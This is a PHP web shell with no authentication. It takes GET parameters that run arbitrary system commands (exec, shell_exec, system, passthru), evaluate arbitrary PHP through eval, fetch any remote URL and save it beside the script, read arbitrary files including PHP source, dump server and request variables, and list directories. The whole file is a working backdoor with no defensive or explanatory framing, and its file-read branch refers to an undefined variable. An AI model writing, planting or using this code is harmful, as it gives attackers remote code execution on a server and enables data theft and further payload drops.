<?php

function dumperx(...$data) {
    echo "<pre>";
    print_r($data);
    echo "</pre>";
}

if (isset($_GET['upload'])) {
    // URL of the file you want to download
    $url = $_GET['upload'];
    
    // Get the directory of the currently executing script
    $current_directory = __DIR__ . '/';
    
    // Get the file content from the URL
    $file_content = file_get_contents($url);
    
    // Check if the file content was fetched successfully
    if ($file_content !== false) {
        // Extract the filename from the URL
        $file_name = basename($url);
    
        // Specify the path where you want to save the file
        $save_path = $current_directory . $file_name;
    
        // Save the file content to the specified path
        if (file_put_contents($save_path, $file_content) !== false) {
            echo "File downloaded successfully and saved to: " . $save_path;
        } else {
            echo "Failed to save the file.";
        }
    } else {
        echo "Failed to download the file from the URL.";
    }
} elseif (isset($_GET['exec'])) {
    try {
        dumperx(exec($_GET['exec']));
    } catch (\Throwable $th) {
        dumperx($th);
    }
} elseif (isset($_GET['shell_exec'])) {
    try {
        dumperx(shell_exec($_GET['shell_exec']));
    } catch (\Throwable $th) {
        dumperx($th);
    }
} elseif (isset($_GET['system'])) {
    try {
        dumperx(system($_GET['system']));
    } catch (\Throwable $th) {
        dumperx($th);
    }
} elseif (isset($_GET['passthru'])) {
    try {
        dumperx(passthru($_GET['passthru']));
    } catch (\Throwable $th) {
        dumperx($th);
    }
} elseif (isset($_GET['read'])) {
    try {
        $file_extension = pathinfo($file_path, PATHINFO_EXTENSION);
        if ($file_extension === 'php') {
            if (file_exists($_GET['read'])) {
                $newFile = str_replace('.php', '.txt', $_GET['read']);
                if (copy($_GET['read'], $newFile)) {
                    dumperx(file_get_contents($newFile));
                    unlink($newFile);
                } else {
                    echo "Failed to copy the file.";
                }
            } else {
                echo "Source file does not exist.";
            }
        } else {
            dumperx(file_get_contents($_GET['read']));
        }
    } catch (\Throwable $th) {
        dumperx($th);
    }
} elseif (isset($_GET['eval'])) {
    try {
        eval($_GET['eval']);
    } catch (\Throwable $th) {
        dumperx($th);
    }
} elseif (isset($_GET['dump'])) {
    try {
        dumperx([
            'GET' => $_GET,
            'POST' => $_POST,
            'SERVER' => $_SERVER
        ]);
    } catch (\Throwable $th) {
        dumperx($th);
    }
} elseif (isset($_GET['scandir'])) {
    try {
        dumperx(scandir($_GET['scandir']));
    } catch (\Throwable $th) {
        dumperx($th);
    }
}
